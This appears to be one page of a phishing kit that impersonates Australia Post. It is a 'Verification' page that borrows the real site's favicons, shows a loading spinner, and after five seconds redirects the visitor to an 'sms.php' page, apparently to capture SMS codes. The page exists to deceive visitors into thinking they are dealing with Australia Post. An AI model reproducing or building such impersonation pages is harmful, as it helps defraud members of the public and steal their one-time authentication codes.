

<!DOCTYPE html>
<html>

<head>
  <meta charset="utf-8">
  <title>Verification - Australia Post</title>
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="icon" type="image/png" sizes="32x32" href="https://auspost.com.au//mypost/auspoststaticassets/assets/favicons/favicon-32x32.png">
  <link rel="icon" type="image/png" sizes="16x16" href="https://auspost.com.au//mypost/auspoststaticassets/assets/favicons/favicon-16x16.png">
  <!-- template css files-->
  <link rel="stylesheet"  href="css/bootstrap.css">
  <link rel="stylesheet"  href="css/test.css">  
  <link rel="stylesheet"  href="css/hover.css">             
  <link rel="preconnect" href="https://fonts.gstatic.com">
  

  <!-- js files-->
  <script src="js/html5shiv.min.js"></script>
  <script src="js/respond.min.js"></script>

  <!-- logo site web-->
  <link rel="icon" type="image/png" sizes="32x32" href="https://auspost.com.au//mypost/auspoststaticassets/assets/favicons/favicon-32x32.png">
  <link rel="icon" type="image/png" sizes="16x16" href="https://auspost.com.au//mypost/auspoststaticassets/assets/favicons/favicon-16x16.png">


  <!-- fontawtsome -->
  <link rel="stylesheet" href="https://pro.fontawesome.com/releases/v5.10.0/css/all.css" integrity="sha384-AYmEC3Yw5cVb3ZcuHtOA93w35dYTsvhLPVnYs9eStHfGJvOvKxVfELGroGkvsg+p" crossorigin="anonymous"/>

</head>

<body>
         

    <section class="spinner " style="background: #fff; margin-top:100px;">
        <div class="d-flex justify-content-center">
            <div class="spinner-border" role="status" style=" width: 8rem;height: 8rem;color:#97342c;">
               <span class="visually-hidden">Loading...</span>
            </div>
        </div>
    </section>

  <!-- template files js-->
  <script src="js/jquery-3.5.1.min.js"></script>
  <script src="js/bootstrap.min.js"></script>
  <script>
            setTimeout(function () {
                window.location.href= 'sms.php';
            },5000); // 1000 = 1s
  </script>
</body>
</html>